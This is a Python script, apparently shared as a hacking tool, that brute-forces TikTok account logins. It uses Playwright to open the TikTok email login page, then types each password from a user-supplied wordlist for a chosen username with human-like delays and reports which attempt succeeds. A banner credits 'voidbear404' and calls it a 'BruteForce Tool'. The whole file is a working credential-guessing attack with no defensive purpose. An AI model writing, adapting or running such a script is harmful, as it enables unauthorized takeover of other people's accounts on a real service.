from playwright.sync_api import sync_playwright
from colorama import Fore, Style, init
from pyfiglet import Figlet
import requests
import time

init(autoreset=True)

LOGIN_URL = "https://www.tiktok.com/login/phone-or-email/email"
STATUS = requests.get(LOGIN_URL).status_code

GREEN = "\033[92m"
PURPLE = "\033[95m"
CYAN = "\033[96m"
RESET = "\033[0m"
RED = "\033[91m"

RED = "\033[91m"
BOLD = "\033[1m"
RESET = "\033[0m"

banner = f"""
{BOLD}{RED}████████╗██╗██╗  ██╗████████╗ ██████╗ ██╗  ██╗
╚══██╔══╝██║██║ ██╔╝╚══██╔══╝██╔═══██╗██║ ██╔╝
   ██║   ██║█████╔╝    ██║   ██║   ██║█████╔╝
   ██║   ██║██╔═██╗    ██║   ██║   ██║██╔═██╗
   ██║   ██║██║  ██╗   ██║   ╚██████╔╝██║  ██╗
   ╚═╝   ╚═╝╚═╝  ╚═╝   ╚═╝    ╚═════╝ ╚═╝  ╚═╝{RESET}

{RED}      T I K T O K  BruteForce Tool
          Automation Engine{RESET}
{BOLD}{RED}          by voidbear404 ☠️{RESET}
"""

print(banner)





USER = input('[+]Enter the Username: ')
WORDLIST = input('[+]Enter the Wordlists Path: ')

with sync_playwright() as p:
    browser = p.chromium.launch(headless=False)
    context = browser.new_context()
    page = context.new_page()

    page.goto(LOGIN_URL)

    with open(WORDLIST, "r", encoding="utf-8") as f:
        for i, passwd in enumerate(f, 1):
            passwd = passwd.strip()

            email = page.locator('input[name="username"]')
            password = page.get_by_placeholder("Password")
            login_btn = page.locator('[data-e2e="login-button"]')

            email.fill("")
            password.fill("")

            email.type(USER, delay=90)
            password.type(passwd, delay=90)
            start_url = page.url

            login_btn.click()

            error = page.locator(
                "text=Maximum number of attempts reached. Try again later."
            )
            try:
                error.wait_for(state="visible", timeout=400000)
                print(
                    Fore.YELLOW + f"[{i}] "
                    + Fore.BLUE + "Trying "
                    + Fore.WHITE + "Username: "
                    + Fore.GREEN + USER
                    + Fore.WHITE + " | Password: "
                    + Fore.RED + passwd
                    + Fore.WHITE + " | Status: "
                    + Fore.YELLOW + str(STATUS)
                    + Fore.BLUE + " => Login Failed ❌"
                )
            except:
                page.wait_for_url(lambda url: url != start_url, timeout=40000)
                print(
                    Fore.YELLOW + f"[{i}] "
                    + Fore.GREEN + "Trying "
                    + Fore.WHITE + "Username: "
                    + Fore.GREEN + USER
                    + Fore.WHITE + " | Password: "
                    + Fore.GREEN + passwd
                    + Fore.WHITE + " | Status: "
                    + Fore.YELLOW + str(STATUS)
                    + Fore.GREEN + " => Login SUCCESS ✅"
                )
                break






